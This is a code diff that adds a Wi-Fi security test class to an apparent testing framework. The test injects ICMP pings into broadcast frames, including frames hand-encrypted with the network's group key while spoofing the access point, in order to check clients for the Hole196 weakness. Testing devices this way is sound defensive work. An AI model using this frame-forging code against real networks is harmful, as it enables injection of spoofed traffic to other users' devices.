@@ -78,3 +78,79 @@ class GroupToAp(Test):
 		self.actions[2].set_receive(self.receive, eth=True)
 		self.actions[3].set_terminate(delay=1)
 
+
+class GroupToClient(Test):
+	"""Send a unicast ICMP ping inside a broadcast data frame."""
+	name = "group-hole196"
+	kind = Test.Authenticator
+
+	def __init__(self):
+		"""Initialization of the sequential actions defining the test case."""
+		super().__init__([
+			# Wait on the supplicant to get an IP address.
+			Action(trigger=Trigger.Connected, action=Action.GetIp),
+
+			# After that inject unicast ICMP ping in multiple broadcast frames.
+			Action(trigger=Trigger.Connected, action=Action.Function),
+
+			# Monitor for ICMP ping replies to our IP address.
+			Action(trigger=Trigger.NoTrigger, action=Action.Receive),
+
+			# Stop the test case once a reply has been received.
+			Action(trigger=Trigger.Received, action=Action.Terminate)
+		])
+
+
+	def inject_as_group(self, station):
+		frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=station.mac)/IP(src=station.ip, dst=station.peerip)/ICMP()/Raw(b"icmp_ping_test")
+		log(STATUS, "Injecting frame: " + repr(frame))
+
+		for i in range(6):
+			station.inject_eth(frame)
+			# Against some devices we need to be fast with sending the frame, to assure it
+			# arrives before the client enters sleep mode. Against others we need to be slow,
+			# to assure it has configured the IP address first. This sleep provides a balance
+			# between injecting fast and also slow. Since group-addressed frames don't get
+			# ACK'ed/retransmitted, sending it multiple times also increases reliability.
+			time.sleep(i * 0.1)
+
+		self.inject_as_group_manual(station)
+		log(STATUS, f"Done injecting. Used GTK={station.gtk} with PN={station.gtk_seq}")
+
+
+	def inject_as_group_manual(self, station):
+		"""This is to demonstrate and confirm the usage of the GTK as the AP"""
+		header = station.get_header()
+		header.addr1 = "ff:ff:ff:ff:ff:ff"
+		header.addr2 = station.mac
+		header.addr3 = "ff:ff:ff:ff:ff:ff"
+		header.FCfield = "from-DS"
+
+		# Using a non-default TID means there's a higher chance that the Packet Number is still valid
+		header.TID = 2
+		# Another extra measure to make sure the Packet Number will be valid
+		station.gtk_seq += 50
+
+		frame = header/LLC()/SNAP()/IP(src=station.ip, dst=station.peerip)/ICMP()/Raw(b"icmp_ping_test")
+		frame = encrypt_ccmp(frame, station.gtk, station.gtk_seq, keyid=station.gtk_idx)
+		log(STATUS, "Injecting frame: " + repr(frame))
+
+		# Inject multiple times because broadcast frames don't get acked/retransmitted
+		for i in range(5):
+			station.inject_mon(frame)
+
+
+	def receive(self, station, frame):
+		if ICMP in frame and frame[IP].dst == station.ip and frame[ICMP].type == 0 \
+			and b"icmp_ping_test" in raw(frame):
+			log(STATUS, f"Received frame: " + repr(frame))
+			log(STATUS, "Got an ICMP reply!", color="green")
+			return True
+
+
+	def generate(self, station):
+		"""Generate the test case by configuring the defined actions."""
+		self.actions[1].set_function(self.inject_as_group)
+		self.actions[2].set_receive(self.receive, eth=True)
+		self.actions[3].set_terminate(delay=1)
+
